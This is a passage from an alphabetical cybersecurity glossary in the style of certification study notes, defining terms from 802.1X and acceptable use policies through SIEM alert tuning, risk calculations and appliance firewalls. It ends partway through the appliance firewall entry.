802.1X / Port-based Network Access Control (PNAC) - A standard for encapsulating EAP communications over a LAN (EAPoL) or WLAN (EAPoW) to implement port-based authentication.

Restricting access by MAC address is difficult to manage and still prone to spoofing. Better security is obtained by forcing computers and/or users to authenticate before full network access is granted. The IEEE 802.1X Port-based Network Access Control (PNAC) standard allows a switch to require authentication when a host connects to one of its ports. 802.1X uses authentication, authorization, and accounting (AAA) architecture:

1. Supplicant - It is the device requesting access such as a user's PC or laptop. In EAP architecture, the device requesting access to the network.

2. Authenticator - It is the switching device (or any type of network access appliance). This does not validate authentication requests directly but acts as a conduit for authentication data. A PNAC switch or router that activates EAPoL and passes a supplicant's authentication data to an authenticating server, such as a RADIUS server.

3. Authentication Server - The server that holds or can contact a directory of network objects and that can validate authentication requests, issue authorizations, and perform accounting of security events.

The 802.1X standard is implemented by two protocols:

1. Extensible Authentication Protocol (EAP) - It provides a framework for deploying multiple types of authentication methods. It is often used with digital certificates to establish a trust relationship and create a secure tunnel to transmit the user credential or to perform smart-card authentication without a password.

2. Remote Authentication Dial-In User Service (RADIUS) - It allows the authenticator and authentication server to communicate authentication and authorization decisions. The authenticator is a RADIUS client; the authentication server is a RADIUS server.

When a host connects to an 802.1X-enabled switch port, the switch opens the port for the EAP over LAN (EAPoL) protocol only. The switch port only allows full data access when the host has been authenticated. The switch receives an EAP packet with the supplicant's credentials. These are encrypted and cannot be read by the switch. The switch uses the RADIUS protocol to send the EAP packet to the authentication server. The authentication server can access the directory of user accounts and can validate the credential. If authentication is successful, it informs the switch that full network access can be granted.
Acceptable Use Policy (AUP) - A policy that governs employees' use of company equipment and Internet services. ISPs may also apply AUPs to their customers. This policy outlines the acceptable ways in which network and computer systems may be used by defining what constitutes acceptable behavior by users. AUPs typically address browsing behavior, appropriate content, software downloads, and handling sensitive information. The goal of an AUP is to ensure that users do not engage in activities that could harm the organization or its resources. Also, the AUP should detail the consequences for non compliance, including details regarding how compliance is monitored and require employees to acknowledge their comprehension of the AUP's rules via signature.	

Enforcing an acceptable use policy (AUP) is important to protect the organization from the security and legal implications of employees misusing its equipment. Typically, the policy will forbid the use of equipment to defraud, defame, or to obtain illegal material. It will prohibit the installation of unauthorized hardware or software and explicitly forbid actual or attempted snooping of confidential data that the employee is not authorized to access. Acceptable use guidelines must be reasonable and not interfere with employees' fundamental job duties or privacy rights. An organization's AUP may forbid use of Internet tools outside of work-related duties or restrict such use to break times.
Access Badges - An authentication mechanism that allows a user to present a smart card to operate an entry system.

Access badges are a fundamental component of physical security in larger organizations where control over access to various locations is critical. Plastic cards embedded with magnetic strips, radio frequency identification (RFID) chips, or near-field communication (NFC) technology are issued to authorized individuals, such as employees, contractors, or visitors instead of physical keys. Access badges replace physical keys but provide access similarly. This is achieved by requiring the badge to be swiped, tapped, or brought into proximity with a reader at the access point, like a door or turnstile. The reader communicates with a control system to verify the badge's authenticity and the level of access granted to the badge holder. If the system recognizes the badge as valid and authorized for that area, the door unlocks, granting access.

It is important to note that implementing this type of access control system requires magnetic door-locking mechanisms and access card readers, which depend upon electrical power and network communications at each access point (such as a doorway.)

A physical access control system (PACS) is a critical component in managing and maintaining security within a facility. It is a system designed to control who can access specific locations within a building or site. The PACS operates through a combination of hardware and software, including access cards or badges, card readers, access control panels, and a centralized control network. The PACS system provides valuable badge access activity logging capabilities.

In addition to controlling access, access badges also serve as a form of identification, displaying pertinent information about the badge holder, such as their name, title, and photograph. This aids in quickly identifying individuals within a facility and verifying that they are in an area appropriate for their role or purpose. Moreover, access badges can provide valuable data for security audits and investigations. Each time a badge is used, a PACS system can log the time, location, and identity associated with the access event. This can be crucial in investigating security breaches, understanding movement patterns, and even planning emergency evacuation strategies.
Access Control List (ACL) - An access control list (ACL) is a list of permissions associated with a network device, such as a router or a switch, that controls traffic at a network interface level. ACLs typically use packet information like source and destination IP addresses, port numbers, and the protocol to decide whether to permit or deny the traffic. They are usually implemented on network devices to provide traffic control across the network, adding a layer of security and efficiency. In contrast, a firewall rule dictates how firewalls should handle inbound or outbound network traffic for specific IP addresses, IP ranges, or network interfaces. Firewalls typically provide both network and application-level control. They are designed to protect a network perimeter by preventing unauthorized access to or from a network. Firewall rules can be based on various factors, such as IP addresses, port numbers, protocols, or even specific application traffic patterns.

The rules in a firewall's ACL are processed from top to bottom. If traffic matches one of the rules, then it is allowed to pass; consequently, the most specific rules are placed at the top. The final default rule is typically to block any traffic that has not matched a rule (implicit deny - The basic principle of security stating that unless something has explicitly been granted access, it should be denied access). If the firewall does not have a default implicit deny rule, an explicit deny all rule can be added manually to the end of the ACL.

Each rule can specify whether to block or allow traffic based on several parameters, often referred to as tuples. If you think of each rule being like a row in a database, the tuples are the columns. For example, in the previous screenshot, the tuples include Protocol, Source (address), (Source) Port, Destination (address), (Destination) Port, and so on.

Even the simplest packet-filtering firewall can be complex to configure securely. It is essential to create a written policy describing what a filter ruleset should do and to test the configuration as far as possible to ensure that the ACLs you have set up work as intended. Also, test and document changes made to ACLs. Some other basic principles include the following:

Block incoming requests from internal or private IP addresses (that have obviously been spoofed).
Block incoming requests from protocols that should only function at a local network level, such as ICMP, DHCP, or routing protocol traffic.
Use penetration testing to confirm the configuration is secure. Log access attempts and monitor the logs for suspicious activity.
Take the usual steps to secure the hardware on which the firewall is running and use the management interface.

For instance, a firewall rule can be specifically designed to permit or deny traffic based on the TCP or UDP port numbers that a service operates on. If a web server on a network should only allow incoming HTTP and HTTPS traffic, rules could be set up to allow traffic only on ports 80 (HTTP) and 443 (HTTPS), the standard ports for these services. Similarly, rules can be defined to restrict certain protocols such as FTP or SSH from entering the network if they are not needed, thereby reducing the potential attack surface.

Additionally, you can use firewall rules to restrict outgoing traffic to prevent certain types of communication from inside the network. For instance, a rule can block all outgoing traffic to port 25 (SMTP) to prevent a compromised machine within the network from sending out spam emails.

Screened Subnet
A screened subnet (A segment isolated from the rest of a private network by one or more firewalls that accepts connections from the Internet over designated ports), also known as a perimeter network, creates an additional layer of protection between an organization's internal network and the Internet. A screened subnet acts as a neutral zone, separating public-facing servers from sensitive internal network resources to reduce the exposure of the internal network resource to external threats. In practical terms, the screened subnet often hosts web, email, DNS, or FTP services. These systems must typically be accessible from the public Internet but isolated from sensitive internal systems to limit the impact of a breach of one of these services. By placing these servers in the screened subnet, an organization can limit the damage if these servers are compromised.

Firewalls are typically used to create and control the traffic to and from the screened subnet. The first firewall, between the Internet and the screened subnet, is configured to allow traffic to the services hosted in the screened subnet. The second firewall, between the screened subnet and the internal network, is configured to block most (practically all) traffic from the screened subnet to the internal network. A screened subnet is a fundamental part of a network's security architecture and an important example of network segmentation as a type of security control.
Access Control Models - Frameworks that define how access rights and permissions are granted to users, including discretionary, mandatory, role-based, attribute-based, and rule-based models.
Access Control Vestibule / Mantrap - A secure entry system with two gateways, only one of which is open at any one time.

An access control vestibule, also known as a mantrap, is a security measure that regulates entry to a secure area. It involves two doors or gates that interlock and permit only one individual to pass through at a time. The first door opens after the person is granted access via an access control system, such as a card reader or biometric scanner. Once the person enters the vestibule, the first door shuts. The second door opens only when the first door is firmly shut. This guarantees only one person can enter or exit at a time, preventing unauthorized access or tailgating. Access control vestibules are frequently used in high-security settings like datacenters, government buildings, and financial institutions to offer an additional layer of physical security control. They effectively deter unauthorized access to secure areas and safeguard sensitive assets against potential physical attacks.
Account Lockout - Policy that prevents access to an account under certain conditions, such as an excessive number of failed authentication attempts.

The system has prevented access to the account because too many failed authentication attempts have been made. Lockout could also mean that the user's password no longer works because the threat actor has changed it.
Account Management - Processes and tools for creating, configuring, monitoring, and controlling user accounts and their privileges, including policies, groups, and privileged access management.
Account Policies - A set of rules governing user security information, such as password expiration and uniqueness, which can be set globally.
Account Restrictions - Policies and controls that limit when, where, and how user accounts can be accessed, including location-based, time-based, and zero standing privilege restrictions.

Policy-based restrictions can be used to mitigate some risks of account compromise through the theft of credentials.

Location-Based Policies - A user or device can have a logical network location, identified by an IP address, subnet, virtual LAN (VLAN), or organizational unit (OU). This can be used as an account restriction mechanism. For example, a user account may be prevented from logging on locally to servers within a restricted OU.

The geographical location of a user or device can be calculated using a geolocation mechanism:

1. IP address  - can be associated with a map location to varying degrees of accuracy based on information published by the registrant, including name, country, region, and city. The registrant is usually the Internet service provider (ISP), so the information you receive will provide an approximate location of a host based on the ISP. If the ISP is one that serves a large or diverse geographical area, it is more difficult to pinpoint the location of the host Internet service providers (ISPs). Software libraries, such as GeoIP, facilitate querying this data.

2. Location services  - are methods used by the OS to calculate the device's geographical position. A device with a global positioning system (GPS) sensor can report a highly accurate location when outdoors. Location services can also triangulate to cell towers, Wi-Fi hotspots, and Bluetooth signals where GPS is not supported.

Time-Based Restrictions - There are four main types of time-based policies:

1. A time-of-day restrictions policy establishes authorized login hours for an account.

2. A duration-based login policy establishes the maximum amount of time an account may be logged in for.

3. An impossible travel time/risky login policy tracks the location of login events over time. If these do not meet a threshold, the account will be disabled. For example, a user logs in to an account from a device in New York City. A couple of hours later, a login attempt is made from Los Angeles, but is refused and an alert is raised because it is not feasible for the user to be in both locations.

4. A temporary permissions policy removes an account from a security role or group after a defined period.
Accounting (AAA) - Tracking authorized usage of a resource or use of rights by a subject and alerting when unauthorized use is detected or attempted.
Active Reconnaissance (Penetration Testing) - Penetration testing techniques that interact with target systems directly.

Active reconnaissance (Penetration testing techniques that interact with target systems directly) involves actively probing and interacting with target systems and networks to gather information. Active reconnaissance includes activities that generate network traffic by directly requesting information from target systems. Active reconnaissance aims to discover and obtain information about the target infrastructure, services, and potential vulnerabilities. Common techniques used in active reconnaissance include the following:

1. Port Scanning - Scanning a target network to identify open ports and the services running on them.

2. Service Enumeration - Interacting with identified services to gather information about their versions, configurations, and potential vulnerabilities.

3. OS Fingerprinting - Attempting to identify the operating system running on target machines by analyzing network responses and behavior.

4. DNS Enumeration - Gathering information about the target's DNS infrastructure, such as domain names, subdomains, and IP addresses.

5. Web Application Crawling - Exploring web applications to identify pages, directories, and potential vulnerabilities.
Active Security Control - Detective and preventive security controls that use an agent or network configuration to monitor hosts. This allows for more accurate credentialed scanning, but consumes some host resources and is detectable by threat actors. An active security control that performs scanning must be configured with credentials and access permissions and exchange data with target hosts. An active control that performs filtering requires hosts to be explicitly configured to use the control. This might mean installing agent software on the host, or configuring network settings to use the control as a gateway.
Ad Hoc Network - A type of wireless network where connected devices communicate directly with each other instead of over an established medium.
Address Resolution Protocol (ARP) - Broadcast mechanism by which the hardware MAC address of an interface is matched to an IP address on a local network segment. The Address Resolution Protocol (ARP) identifies the MAC address of a host on the local segment that owns an IPv4 address.
Advanced / Enterprise Authentication - Wireless enterprise authentication (A wireless network authentication mode where the access point acts as pass-through for credentials that are verified by an AAA server) modes, such as WPA2/WPA3-Enterprise, include several essential components designed to improve security for corporate wireless networks. One important element is 802.1x authentication, which provides a port-based network access control framework, ensuring that only authenticated devices are granted network access. Typically, 802.1x requires an authentication server such as RADIUS (Remote Authentication Dial-In User Service), which verifies the credentials of users or devices trying to connect to the network.

In enterprise mode authentication schemes, users have a unique set of credentials rather than a shared passphrase as used in WPA2/WPA3 personal mode. Requiring each user or device to authenticate using unique credentials allows network administrators to track network usage at a granular level. The protocol also supports multiple Extensible Authentication Protocol (EAP) types, such as EAP-TLS, EAP-TTLS, or PEAP, which define specific authentication methods. EAP-TLS, for instance, uses client-server certificates for mutual authentication, while EAP-TTLS and PEAP utilize a server-side certificate. The server-side certificate is used to establish a secure tunnel for transmitting user credentials and helps devices validate the legitimacy of the access point. Enterprise mode authentication includes dynamic encryption key management, automatically changing the encryption keys used during a user's session.
Advanced Data Protection - Advanced techniques and methods for protecting data beyond traditional backups, including snapshots, replication, journaling, and encryption strategies to ensure data availability, integrity, and security.	

Snapshots
Snapshots (used to create the entire architectural instance/copy of an application, disk, or system. It is often used in backup processes to provide rollback points that can restore the system or disk of a particular device to a specific time. While snapshots assist in backup strategies, they are not the same as image backups and depend on the original data) play a vital role in data protection and recovery, capturing the state of a system at a specific point in time. Virtual Machine (VM), filesystem, and Storage Area Network (SAN) snapshots are three different types, each targeting a particular level of the storage hierarchy.

VM snapshots, such as those created in VMware vSphere or Microsoft Hyper-V, capture the state of a virtual machine, including its memory, storage, and configuration settings. This allows administrators to roll back the VM to a previous state in case of failures, data corruption, or during software testing.
Filesystem snapshots, like those provided by ZFS or Btrfs, capture the state of a file system at a given moment, enabling users to recover accidentally deleted files or restore previous versions of files in case of data corruption.
SAN snapshots are taken at the block-level storage layer within a storage area network. Examples include snapshots in NetApp or Dell EMC storage systems, which capture the state of the entire storage volume, allowing for rapid recovery of large datasets and applications.
By utilizing VM, filesystem, and SAN snapshots, organizations can enhance their data protection and recovery strategies, ensuring the availability and integrity of their data across different storage layers and systems.

Replication and Journaling
Replication and journaling are data protection methods that ensure data availability and integrity by maintaining multiple copies and tracking changes to data.

Replication involves creating and maintaining exact copies of data on different storage systems or locations. Organizations can safeguard against data loss due to hardware failures, human errors, or malicious attacks by having redundant copies of the data. In the event of a failure, the replicated data can be utilized to restore the system to its original state.

A practical example of replication is database mirroring, where an organization maintains primary and secondary mirrored databases. Any changes made to the primary database are automatically replicated to the secondary database, ensuring data consistency and availability if the primary database encounters any issues.

On the other hand, journaling (a method used by file systems to record changes not yet made to the file system in an object called a journal) records changes to data in a separate, dedicated log known as a journal. Organizations can track and monitor data modifications and revert to previous states if necessary. Journaling is beneficial for data recovery in system crashes. It enables the system to identify and undo any incomplete transactions that might have caused inconsistencies, or replay transactions that occurred after the full system backup was completed. This provides greater granularity for restores and greatly minimizes data loss. A practical example of journaling is using file system journaling, such as the Journaled File System (JFS) or the New Technology File System (NTFS), with journaling enabled. These file systems maintain a record of all changes made to files, allowing for data recovery and consistency checks after unexpected system shutdowns or crashes.

Remote journaling, SAN replication, and VM replication are advanced data protection methods that maintain data availability and integrity across multiple locations and systems. Remote journaling creates and maintains a journal of data changes at a separate, remote location, allowing for data recovery and ensuring business continuity in case of local failures, natural disasters, or malicious attacks.

SAN replication duplicates data from one SAN to another in real time or near real time, providing redundancy and protection against hardware failures, human errors, or data corruption. This technique involves synchronous replication, which guarantees data consistency, and asynchronous replication, which is more cost-effective but slightly less stringent in consistency.

Meanwhile, VM replication creates and maintains an up-to-date copy of a virtual machine on a separate host or location, ensuring that a secondary VM can quickly take over the workload in the event of a primary VM failure or corruption. By implementing these methods, organizations can bolster their data protection strategies, safeguarding against various risks and ensuring the availability and integrity of their critical data and systems.

Encrypting Backups
Encryption of backups is essential for various reasons, primarily data security, privacy, and compliance. By encrypting backups, organizations add an extra layer of protection against unauthorized access or theft, ensuring that sensitive data remains unreadable without the appropriate decryption key. This is particularly crucial for businesses dealing with sensitive customer data, intellectual property, or trade secrets, as unauthorized access can lead to severe reputational damage, financial loss, or legal consequences.

Copies of sensitive data stored in backup sets are often overlooked, so many industries and jurisdictions have regulations that mandate the protection of sensitive data stored in backups. Encrypting backups helps organizations meet these regulatory requirements and avoid fines, penalties, or legal actions resulting from noncompliance.
Advanced Persistent Threat (APT) - An attacker's ability to obtain, maintain, and diversify access to network systems using exploits and malware. The term advanced persistent threat (APT) was coined to understand the behavior underpinning modern types of cyber adversaries. Rather than think in terms of systems being infected with a virus or Trojan, an APT refers to the ability of an adversary to achieve ongoing compromise of network security—to obtain and maintain access—using a variety of tools and techniques.
Adware - Software that records information about a PC and its user. Adware is used to describe software that the user has acknowledged can record information about their habits.

This is a class of PUP/bloatware that performs browser reconfigurations, such as allowing tracking cookies, changing default search providers, opening sponsor's pages at startup, adding bookmarks, and so on. Adware may be installed as a program or as a browser extension/plug-in.
AES Galois Counter Mode (GCM) - A high performance mode of operation for symmetric encryption. Provides a special characteristic called authenticated encryption with associated data, or AEAD. It replaces AES CCM with the AES Galois Counter Mode (GCM) mode of operation. Galois Counter Mode has higher levels of performance than CCM.
Agent-Based Filtering - Agent-based web filtering involves installing a software agent on desktop computers, laptops, and mobile devices. The agents enforce compliance with the organization's web filtering policies. Agents communicate with a centralized management server to retrieve filtering policies and rules and then apply them locally on the device. Agent-based solutions typically leverage cloud platforms to ensure they can communicate with devices regardless of the network they are connected to. This means filtering policies remain in effect even when users are off the corporate network, such as when working from home or traveling.

Agent-based filtering can also provide detailed reporting and analytics. The agent can log web access attempts and return this data to a management server for analysis allowing security analysts to monitor Internet usage patterns, identify attempts to access blocked content, and fine-tune the filtering rules as required. Because filtering occurs locally on the device, agent-based methods often provide more granular control, such as filtering HTTPS traffic or applying different filtering rules for different applications.
Agentless Scanning - A vulnerability scanning approach that assesses hosts remotely over the network without installing any software on the target systems. The scanner connects using protocols like SSH, WMI, or SNMP to query and analyze targets, making it easier to deploy across large environments. This method is commonly favored by threat actors during reconnaissance because it allows them to probe systems externally without needing prior access to install anything, leaving a smaller footprint.
Air-gap - A type of network isolation that physically separates a host from other hosts or a network from all other networks.

Some hosts are so security-critical that it is unsafe to connect them to any type of network. One example is the root certification authority in PKI. Another example is a host used to analyze malware execution. A host that is not physically connected to any network is said to be air-gapped.

It is also possible to configure an air-gapped network. This means that hosts within the air-gapped network can communicate, but there is no cabled or wireless connection to any other network. Military bases, government sites, and industrial facilities use air-gapped networks.

Physically isolating a host or group of hosts improves security but also incurs significant management challenges. Device administration has to be performed at a local terminal. Any updates or installs have to be performed using USB or optical media. This media is a potential attack vector and must be scanned before allowing its use on an air-gapped host.
Alarm Systems and Sensors - Alarms play a vital role in physical security by supplementing other security controls. Alarms alert security personnel and building occupants of potential threats or breaches. They are both detective and deterrent controls, notifying of trouble and discouraging unauthorized access and criminal activity. Alarms are often integrated with other physical security controls, such as access control systems, surveillance cameras, or motion sensors, to enhance their effectiveness. The following list describes several common types of alarms:

1. Circuit - Uses a circuit-based alarm that sounds when the circuit is opened or closed, depending on the type of alarm. For example, this could be a door or window opening or by a fence being cut. A closed-circuit alarm is more secure because it cannot be defeated by cutting the circuit like an open-circuit alarm.

2. Motion Detection - Uses a motion-based alarm linked to a detector that is triggered by any movement within an area such as a room (defined by the sensitivity and range of the detector). The sensors in these detectors are either microwave radio reflection (similar to radar) or passive infrared (PIR), which detect moving heat sources.

3. Noise Detection - Uses an alarm triggered by sounds picked up by a microphone. Modern AI-backed analysis and identification of specific types of sound can render this type of system less prone to false positives.

4. Proximity - Uses radio frequency ID (RFID) tags and readers to track the movement of tagged objects within an area. This allows an alarm system to detect whether someone is trying to remove equipment.

5. Duress - Uses an alarm triggered manually by staff if they come under threat. There are many ways of implementing this type of alarm, including wireless pendants, concealed sensors or triggers, and DECT handsets or smartphones. Some electronic entry locks can also be programmed with a duress code different from the ordinary access code. This will open the gateway but also alert security personnel that the lock has been operated under duress.

Circuit-based alarms are suited for use at the perimeter and on windows and doors. These may register when a gateway is opened without using the lock mechanism properly or when a gateway is held open for longer than a defined period. Motion detectors are useful for controlling access to spaces not normally used. Duress alarms are useful for exposed staff in public areas. An alarm might simply sound like an alert or be linked to a monitoring system. Many alarms are linked directly to local law enforcement or third-party security companies. A silent alarm alerts security personnel rather than sounding an audible alarm.

Sensor Types
Sensors (A component in an alarm system that identifies unauthorized entry via infrared-, ultrasonic-, microwave-, or pressure-based detection of thermal changes or movement) are critical in implementing physical security measures, providing proactive detection and alerting capabilities against potential security breaches. These devices can employ various technologies, including infrared, pressure, microwave, and ultrasonic systems, each with unique advantages and suitable applications.

1. Infrared sensors - Are commonly used in motion detection systems. They detect changes in heat patterns caused by moving objects, such as a human intruder. These are often used in residential and commercial security systems, triggering alarms or activating security lights when detecting motion.

2. Pressure sensors - Are typically installed inside floors or mats and are activated by weight. They can be used in high-security areas to detect unauthorized access or even in retail environments to count foot traffic.

3. Microwave sensors - Emit microwave pulses and measure the reflection off a moving object. They are often combined with infrared detectors in dual-technology motion sensors. These sensors are less likely to trigger false alarms, as the infrared and microwave sensors must be tripped simultaneously to trigger an alarm. These can be useful in securing large outdoor areas like parking lots or fenced areas.

4. Ultrasonic sensors - Emit sound waves at frequencies above the range of human hearing and measure the time it takes for the waves to return after hitting an object. They are often used in automated lighting systems to switch lights on when someone enters a room and switch them off again when the room is empty.
Alert Tuning - Correlation rules are likely to assign a criticality level to each match. Examples include the following:

1. Log only - An event is produced and added to the SIEM's database, but it is not automatically classified.

2. Alert - The event is listed on a dashboard or incident handling system for an agent to assess. The agent analyzes the event data and either dismisses it to the log or validates it and starts an incident case.

3. Alarm - The event is automatically classified as critical, and a priority alarm is raised. This might mean emailing an incident handler or sending a text message.

Alert tuning (The process of adjusting detection and correlation rules to reduce incidence of false positives and low-priority alerts) is necessary to reduce the incidence of false positives. False positive alerts and alarms waste analysts' time and reduce productivity. Alert fatigue refers to the sort of situation where analysts are so consumed with dismissing numerous low-priority alerts that they miss a single high-impact alert that could have prevented a data breach. Analysts can become more preoccupied with looking for a quick reason to dismiss an alert than with properly evaluating the alert. Reducing false positives is difficult, however: firstly because there isn't a simple dial to turn for overall sensitivity, and secondly because reducing the number of rules that produce alerts increases the risk of false negatives.

A false negative is where the system fails to generate an alert about malicious indicators that are present in the data source. False negatives are a serious weakness in the security system. One of the purposes of threat hunting activity is to identify whether the monitoring system is subject to false negatives.

There is also a concept of true negatives. This is a measure of events that the system has properly allowed. Metrics for false and true negatives can be used to assess the performance of the alerting system.

Some of the techniques used to manage alert tuning include the following:

1. Refining detection rules and muting alert levels - If a certain rule is generating multiple dashboard notifications, the parameters of the rule can be adjusted to reduce this, perhaps by adding more correlation factors. Alternatively, the alert can be muted to log-only status or configured so that it only produces a single notification for every 10 or 100 events.

2. Redirecting sudden alert "floods" to a dedicated group - Changes in the network can cause a rule to start producing far more alerts than it should. Once it's confirmed that this is a false positive, rather than "spamming" each analyst's dashboard, it can be assigned to a dedicated agent or team to remediate.

3. Redirecting infrastructure-related alerts to a dedicated group - Misconfigurations, such as deviance from a baseline, can cause continually high alert volumes. While these are important to fix, that is not the job of the incident response team and is better managed by an infrastructure team.

4. Continuous monitoring of alert volume and analyst feedback - Managers should keep oversight of the system and be aware of risks from alert fatigue. The experience of individual analysts can be utilized to reduce alert sensitivity or change the parameters of a given rule or to automate processing of the rule using a SOAR solution.

5. Deploying machine learning (ML - A component of AI that enables a machine to develop strategies for solving a task given a labeled dataset where features have been manually identified but without further explicit instructions) analysis - ML is able to rapidly analyze the sort of data sets produced by SIEM. It can be used to monitor how analysts are responding to alerts, and attempt to automatically tune the ruleset in a way that reduces false negatives without impacting true positives.
Alerting and Monitoring Activities - When data has been collected and aggregated, the SIEM can be used to implement alerting, reporting, and archiving activities.

Note that these activities can be performed manually or automated using discrete tools for each security appliance. The advantage of a SIEM is to consolidate the activities to a single management interface. This consolidated functionality referred to as a "single pane of glass" refers to the enhanced visibility into a complex environment that such software offers.

Alerting
A SIEM can then run correlation rules on indicators extracted from the data sources to detect events that should be investigated as potential incidents. An analyst can also filter or query the data based on the type of incident that has been reported.

Correlation (A function of log analysis that links log and state data to identify a pattern that should be logged or alerted as an event) means interpreting the relationship between individual data points to diagnose incidents of significance to the security team. A SIEM correlation rule is a statement that matches certain conditions. These rules use logical expressions, such as AND and OR, and operators, such as == (matches), < (less than), > (greater than), and in (contains). For example, a single-user login failure is not a condition that should raise an alert. Multiple user login failures for the same account, taking place within the space of one hour, is more likely to require investigation and is a candidate for detection by a correlation rule.

Error.LoginFailure > 3 AND LoginFailure.User AND Duration < 1 hour

As well as correlation between indicators observed in the collected data, a SIEM is likely to be configured with a threat intelligence feed. This means that data points observed in the collected network data can be associated with known threat actor indicators, such as IP addresses and domain names.

Each alert will be dealt with by the incident response processes of analysis, containment, eradication, and recovery. When used in conjunction with a SIEM, two particular steps in alert response and remediation deserve particular attention:

1. Validation during the analysis process is how the analyst decides whether the alert is a true positive and needs to be treated as an incident. A false positive is where an alert is generated, but there is no actual threat activity.

2. Quarantine is the step of isolating the source of indicators, such as a network address, host computer, or file.

Alert response and remediation steps will often be guided by a playbook that assists the analyst with applying all incident response processes for a given scenario. One of the advantages of SIEM and advanced security orchestration, automation, and reporting (SOAR) solutions is to fully or partially automate validation and remediation. For example, a quarantine action could be available as a mouse-click action via an integration with a firewall or endpoint protection product. Validation is made easier by being able to correlate event data to known threat data and pivot between sources, such as inspecting the packets that triggered a particular IDS alert.

Reporting
Reporting is a managerial control that provides insight into the status of the security system. A SIEM can assist with reporting activity by exporting summary statistics and graphs. Report formats and contents are usually tailored to meet the needs of different audiences:

1. Executive reports provide a high-level summary for decision-makers. This guides planning and investment activity.

2. Manager reports provide cybersecurity and department leaders with detailed information. This guides day-to-day operational decision-making.

3. Compliance reports provide whatever information is required by a regulator.

Determining which metrics are most useful in terms of reporting is always very challenging. The following types illustrate some common use cases for reporting:

1. Authentication data, such as failed login attempts, and critical file audit data.

2. Hosts with missing patches and/or configuration vulnerabilities.

3. Privileged user account anomalies, such as out-of-hours use or excessive requests for elevated permissions.

4. Incident case management statistics, such as overall volume, open cases, time to resolve, and so on.

5. Trend reporting to show changes to key metrics over time.

Archiving
A SIEM can enact a retention policy so that historical log and network traffic data is kept for a defined period. This allows for retrospective incident and threat hunting and can be a valuable source of forensic evidence. It can also meet compliance requirements to hold archives of security information. SIEM performance will degrade if an excessive amount of data is kept available for live analysis. A log rotation scheme can be configured to move outdated information to archive storage.
Allow List - A security configuration where access is denied to any entity (software process, IP/domain, and so on) unless the entity appears on a whitelist.
Allowed and Blocked Changes - Allow lists and block lists, also known as deny lists, play a significant role in change management practices and can reference two different viewpoints. One scenario observes allow and block lists in relation to change types or from a different viewpoint.
Allow and block lists describe software restriction approaches designed to control computer software. In terms of change management, an allow list describes a list of approved software, hardware, and specific change types (such as routine or low-risk changes) that are not required to go through the entire change management process. An allow list may also include specific individuals with change management approval authority. Allow lists help streamline change management by reducing the time and effort required for trusted or preauthorized changes. Allow lists must be updated via regular reviews to stay corrected with changing organizational needs.

A block list includes explicitly blocked software, hardware, and specific change types. The block list might include software and hardware with known security or compatibility issues, high-risk or high-impact changes that must always go through the full change management process, or individuals who are not authorized to implement or approve changes. In this regard, block lists help prevent unauthorized or risky changes from being implemented. They can serve as a security measure to clearly identify off-limits change types so that there is no room for negotiation or misinterpretation.

Allow and block lists also refer to technical controls that exist in a few different contexts, including access controls, firewall rules, and software restriction mechanisms. Allow and block lists can impact change implementation by causing unintended problems. For example, software allow lists can be negatively impacted by software patching. If allow lists are based on executable file hash values, they will fail to recognize newly patched executables after patching because their hash values will change. This can result in fully patched systems that are unusable by employees because none of the previously allowed software can run. Regarding change management, it is important to incorporate the potential impacts of allow and block lists into the testing plan.

Restricted activities refer to actions or changes that require additional scrutiny, strict controls, or higher levels of approval/authorization due to their potential impact on critical systems, sensitive data, or regulatory compliance.
Amplification Attack (DDoS) - A network-based attack where the attacker dramatically increases the bandwidth sent to a victim during a DDoS attack by implementing an amplification factor.

An amplification attack is a type of reflected attack that targets weaknesses in specific application protocols to make the attack more effective at consuming target bandwidth. Amplification attacks exploit protocols that allow the attacker to manipulate the request in such a way that the target is forced to respond with a large amount of data. Protocols commonly targeted include domain name system (DNS), Network Time Protocol (NTP), and Connectionless Lightweight Directory Access Protocol (CLDAP). Another example of a particularly effective attack exploits the memcached database caching system used by web servers.
Annualized Loss Expectancy (ALE) - The total cost of a risk to an organization on an annual basis. This is determined by multiplying the SLE by the annual rate of occurrence (ARO).

The amount that would be lost over the course of a year. This is determined by multiplying the SLE by the annualized rate of occurrence (ARO - In risk calculation, an expression of the probability/likelihood of a risk as the number of times per year a particular loss is expected to occur). ARO describes the number of times in a year that an event occurs. In our previous (highly simplified) example, if it is anticipated that a tornado weather event will cause an impact twice per year, then the ARO is considered to be simply "2". The ALE is the cost of the event (SLE) multiplied by the number of times in a year it occurs. In the tornado example, SLE is $80,000 and ARO is 2 so the ALE is $160,000. This number is useful when considering different ways to protect the building from tornados. If it is known that tornados will have a $160,000 per year average cost, then this number can be used as a comparison when considering the cost of various protections.
Annualized Rate of Occurrence (ARO) - In risk calculation, an expression of the probability/likelihood of a risk as the number of times per year a particular loss is expected to occur.

ARO describes the number of times in a year that an event occurs. In our previous (highly simplified) example, if it is anticipated that a tornado weather event will cause an impact twice per year, then the ARO is considered to be simply "2". The ALE is the cost of the event (SLE) multiplied by the number of times in a year it occurs. In the tornado example, SLE is $80,000 and ARO is 2 so the ALE is $160,000. This number is useful when considering different ways to protect the building from tornados. If it is known that tornados will have a $160,000 per year average cost, then this number can be used as a comparison when considering the cost of various protections.
Anomalous Behavior Recognition - Systems that automatically detect users, hosts, and services that deviate from what is expected, or systems and training that encourage reporting of this by employees.

Anomalous behavior recognition refers to actions or patterns that deviate significantly from expectations. Examples include unusual network traffic, user account activity anomalies, insider threat actions, abnormal system events, and fraudulent transactions. Techniques such as network intrusion detection, user behavior analytics, system log analysis, and fraud detection are utilized to identify anomalous behavior. These techniques require monitoring and analyzing different data sources, comparing observed behavior against established baselines, and utilizing machine learning algorithms to detect deviations.
Antivirus - Inspecting traffic to locate and block viruses.
Antivirus Scan - Software capable of detecting and removing virus infections and (in most cases) other types of malware, such as worms, Trojans, rootkits, adware, spyware, password crackers, network mappers, DoS tools, and so on.
Anything as a Service (XaaS) - The concept that most types of IT requirements can be deployed as a cloud service model.
Appliance Firewall - A standalone hardware device that performs only the function of a firewall, which is embedded into the appliance's firmware.

An appliance firewall is a stand-alone hardware firewall deployed to monitor traffic passing into and out of a network zone. An appliance firewall can be deployed in three ways:

1. Routed (layer 3) - The firewall performs forwarding between subnets. Each interface on the firewall connects to a different subnet and represents a different security zone. Each interface is configured with an IP and MAC address.

2. Bridged (layer 2) - The firewall inspects traffic passing between two nodes, such as a router and a switch. It bridges the Ethernet interfaces between the two nodes, working like a switch. Despite performing forwarding at layer 2, the firewall can still inspect and filter traffic on the basis of the full range of packet headers. The firewall's interfaces are configured with MAC addresses, but not IP addresses.

